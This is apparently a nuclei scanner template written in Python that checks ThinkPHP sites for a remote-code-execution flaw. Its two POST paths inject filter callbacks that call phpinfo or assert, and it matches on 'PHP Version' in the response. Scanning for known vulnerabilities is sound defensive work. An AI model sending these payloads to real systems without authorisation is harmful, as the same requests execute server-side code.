from nuclei import BaseHTTP,Template
http = BaseHTTP(method="POST")
http.set_paths(
    paths=[
        "{{BaseURL}}/?s=/Index/\\think\\Request/input&filter[]=phpinfo&data=-1",
        "{{BaseURL}}/?s=/Index/\\think\\request/input?data[]=phpinfo()&filter=assert",
    ]
)
http.set_body_word_matcher(
    patterns=[
        "PHP Version"
    ]
)
http.dump(
    id="tp5024_5130",
    fingers=[
        "thinkphp"
    ]
)